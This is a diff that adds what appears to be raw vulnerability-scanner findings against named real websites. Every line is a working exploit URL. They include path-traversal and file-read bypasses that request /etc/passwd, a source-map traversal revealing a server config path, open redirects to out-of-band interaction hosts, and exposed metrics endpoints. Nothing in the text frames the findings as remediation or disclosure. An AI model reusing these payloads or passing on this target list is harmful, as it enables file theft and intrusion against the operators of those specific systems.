@@ -1,0 +1,10 @@
+[CVE-2025-30208] [http] [medium] https://staking.asxn.xyz/etc/passwd?raw??
+[CVE-2025-31125] [http] [medium] https://staking.asxn.xyz/@fs/etc/passwd?import&?inline=1.wasm?init
+[CVE-2026-39365] [http] [medium] https://staking.asxn.xyz/node_modules/.vite/deps/../../../config.production.js.map ["/root/staking_app/sthype_staking_app/config.production.js"]
+[open-redirect-generic] [http] [medium] https://staging.mito.fi//oast.me/..;/css [redirect="/oast.me/..;/css"]
+[CVE-2025-54793] [http] [medium] https://staging.mito.fi//interact.sh/en
+[CVE-2025-31486] [http] [medium] https://staking.asxn.xyz/etc/passwd?.svg?.wasm?init
+[mongodb-exporter-metrics] [http] [medium] https://rpc-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-consensus-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-consensus-hoodi-beta.morphl2.io/metrics
+[mongodb-exporter-metrics] [http] [medium] https://rpc-hoodi-beta.morphl2.io/metrics
